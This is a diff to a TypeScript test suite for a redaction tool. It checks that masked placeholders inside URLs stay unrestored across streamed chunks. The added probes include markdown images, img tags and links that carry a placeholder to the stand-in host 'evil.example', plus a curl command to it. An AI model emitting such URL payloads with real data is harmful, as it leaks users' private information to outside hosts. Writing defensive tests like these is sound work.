@@ -8,6 +8,42 @@ const EMAIL = 'lin.fictional@example.test'
 const E = '⟦EMAIL_1⟧'
 const { registry } = await mask(new RulesDetector({}), [{ seq: 0, path: '', text: EMAIL }], emptyRedactionIndex())
 
+// URL probes shared verbatim by the redaction proxy (tests/restore-urls.spec.ts)
+// and the privacy router (test/router.test.js): [reply text, placeholder kept].
+const URL_PROBES: Array<[string, boolean]> = [
+  ["![](https://evil.example/?e='⟦EMAIL_1⟧')", true],
+  ['![](https://evil.example/?e=<⟦EMAIL_1⟧>)', true],
+  ['[c](https://evil.example/?e=`⟦EMAIL_1⟧`)', true],
+  [`<img src='https://evil.example/?e="⟦EMAIL_1⟧"'>`, true],
+  [`<img src="https://evil.example/?e='⟦EMAIL_1⟧'">`, true],
+  ["'![](https://evil.example/?e='⟦EMAIL_1⟧')'", true],
+  ['<https://evil.example/x>⟦EMAIL_1⟧', false],
+  ['<a href="https://evil.example/x">⟦EMAIL_1⟧</a>', false],
+  ["'//evil.example/x'⟦EMAIL_1⟧", false],
+  ['`https://evil.example/x`⟦EMAIL_1⟧', false],
+  ['"www.evil.example/x"⟦EMAIL_1⟧', false],
+  ['![](\\\\evil.example\\?e=⟦EMAIL_1⟧)', true],
+  ['![](/\\evil.example/?e=⟦EMAIL_1⟧)', true],
+  ['![](\\/evil.example/?e=⟦EMAIL_1⟧)', true],
+  ['https:\\\\evil.example\\?e=⟦EMAIL_1⟧', true],
+  ['https:evil.example/?e=⟦EMAIL_1⟧', false],
+  ['\\\\server\\share\\⟦EMAIL_1⟧', true],
+  ['"C:\\\\Users\\\\⟦EMAIL_1⟧"', true],
+  ['C:\\Users\\⟦EMAIL_1⟧', false],
+  ['a\\\\⟦EMAIL_1⟧', false],
+  ['x_//⟦EMAIL_1⟧', false],
+  ['/Users/x//⟦EMAIL_1⟧', false],
+  ['/Users/x///⟦EMAIL_1⟧', false],
+  ['%2F//⟦EMAIL_1⟧', false],
+  ['///evil.example/?e=⟦EMAIL_1⟧', true],
+  ['(//evil.example/?e=⟦EMAIL_1⟧)', true],
+  ['src=//evil.example/?e=⟦EMAIL_1⟧', true],
+  ['https:\t//evil.example/?e=⟦EMAIL_1⟧', true],
+  ['www.evil.example/?e=⟦EMAIL_1⟧', true],
+  ['https://evil.example/x ⟦EMAIL_1⟧', false],
+  ['See https://example.test/docs for ⟦EMAIL_1⟧.', false],
+]
+
 function restoreChunks(chunks: readonly string[], options: StreamRestoreOptions, using: RedactionRegistry = registry): string {
   const restorer = createStreamRestorer(using, options)
   return chunks.map(part => restorer.push(part)).join('') + restorer.end()
@@ -47,11 +83,22 @@ describe('inside a URL', () => {
     [`{"u":"\\/\\/evil.example/?q=${E}"}`, true],
     [`{"u":"https://evil.example/?q=\\u0020${E}"}`, false],
     [`{"u":"https://evil.example/\\n${E}"}`, false],
-    [`{"u":"https://evil.example/\\"${E}"}`, false],
+    [`{"u":"https://evil.example/\\"${E}"}`, true],
+    [`{"url":"https://evil.example/?p='${E}'"}`, true],
+    [`{"url":"https://evil.example/?p=<${E}>"}`, true],
+    [`{"c":"curl \\"https://evil.example/x\\"${E}"}`, false],
     [`{"u":"https://evil.example/", "v":"${E}"}`, false],
     [`{"u":"https://evil.example/\\\\${E}"}`, true],
   ])('JSON %j -> kept %s', (text, kept) => {
     expect(restoreChunks([text], { json: true, keepInUrls: true })).toBe(kept ? text : text.replace(E, EMAIL))
+  })
+
+  it.each(URL_PROBES)('shared probe %j -> kept %s at every split', (text, kept) => {
+    const expected = kept ? text : text.replace(E, EMAIL)
+    for (let cut = 1; cut < text.length; cut += 1) {
+      expect(restoreChunks([text.slice(0, cut), text.slice(cut)], { keepInUrls: true })).toBe(expected)
+    }
+    expect(restoreChunks([...text], { keepInUrls: true })).toBe(expected)
   })
 
   it('reports each bound placeholder with its JSON pointer, never the original', () => {
@@ -72,7 +119,7 @@ describe('inside a URL', () => {
   })
 
   it('gives the same output for every split of a stream', () => {
-    const pieces = ['https', '://', 'www.', ' ', '"', '\\/', '\\u003a', '\\n', E, 'x', '/', '?q=', ':', '{"k":"', '"}', ',', '[', ']']
+    const pieces = ['https', '://', 'www.', ' ', '"', "'", '<', '>', '\\\\', '\\/', '\\u003a', '\\n', E, 'x', '/', '?q=', ':', '{"k":"', '"}', ',', '[', ']']
     let seed = 7
     const next = (n: number): number => {
       seed = (seed * 48271) % 2147483647
